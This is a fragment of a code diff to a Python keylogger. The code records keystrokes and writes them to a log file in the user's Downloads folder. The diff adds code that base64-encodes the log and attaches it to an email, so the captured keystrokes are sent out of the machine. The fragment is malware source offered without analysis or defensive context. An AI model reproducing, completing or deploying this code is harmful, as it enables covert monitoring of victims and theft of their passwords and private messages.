@@ -53,7 +53,7 @@ def on_press(key):
     else:
         displayData.append(key)
 
-def write_file(count):
+def write_file():
     savingLocation = os.path.expanduser('~') + '/Downloads/' #Choosing the destination where we want the .txt file to be written
     fileName = 'log.txt'
     file = savingLocation + fileName
@@ -78,7 +78,7 @@ def send_logs():
     while True:
         if len(displayData) > 1:
             try:
-                write_file(count)
+                write_file()
 
                 subject = f'["Log of "{user}] ~ {count}'
 
@@ -93,5 +93,16 @@ def send_logs():
                 print('attachment')
 
                 filename = toDeleteFile[0].split('/')[2]
+
+                part = MIMEBase('application', 'octect-stream')
+                part.set_payload((attachment).read())
+                encoders.encode_base64(part)
+                part.add_header('content-disposition', 'attachment;filename=' + str(filename))
+                log.attach(part)
+
+                text = log.as_string()
+                print('test msg.as_string')
+
+                
 
 
